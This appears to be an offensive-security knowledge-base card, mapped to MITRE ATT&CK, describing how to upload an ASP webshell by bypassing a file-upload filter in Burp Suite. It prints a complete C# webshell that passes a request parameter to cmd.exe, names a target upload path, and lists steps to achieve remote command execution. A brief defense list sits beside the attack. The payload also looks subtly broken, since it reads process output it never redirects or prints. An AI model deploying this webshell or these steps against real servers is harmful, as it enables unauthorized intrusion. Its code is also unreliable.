---
id: proc-003
tags:
  - webshell
  - file-upload
  - asp
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:22.957Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Malicious-ASP-Webshell

## Summary

This procedure modifies and forwards the intercepted upload request to deploy an ASP webshell, exploiting the file type bypass to achieve server-side execution capability.

## Description

The webshell code is injected into the file content, using C# to execute OS commands via Request["getsc"]. The filename bypass (e.g., shell.asp ) tricks the validation, uploading to /recruitjob/tempfiles/temp_uploaded_[GUID].asp. This enables RCE on the Windows ASP.NET server.

## Requirements

1. Intercepted request from Burp Suite
2. Webshell payload: <%@ Page Language="C#" %><% Response.Write("<h1>POC by hackerone_john stone</h1><textarea readonly cols=80 rows=25>"); System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["getsc"]).StandardOutput.ReadToEnd(); Response.Write("</textarea>"); %>
3. Valid session cookies

## Defense

Defensive measures and detection strategies:

- Enforce strict server-side file validation with content scanning
- Scan uploads for executable code patterns (e.g., <%@ Page)
- Isolate upload directories with no-execute permissions

## Objectives

1. Deploy persistent webshell
2. Confirm upload success
3. Enable command execution

## Instructions

### Step 1: Inject Webshell Code

**Context**: Replace file contents with malicious ASP code.

In Burp, edit the multipart body to include the webshell script as the file content.

> Payload ensures command execution via getsc parameter, outputting in HTML textarea.

### Step 2: Forward Modified Request

**Context**: Submit the altered request to the server.

Click Forward in Burp Proxy or Send in Repeater to upload.

> Response: 200 OK, file saved with GUID, accessible at /recruitjob/tempfiles/temp_uploaded_[GUID].asp.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[webshell]]
- [[file-upload]]
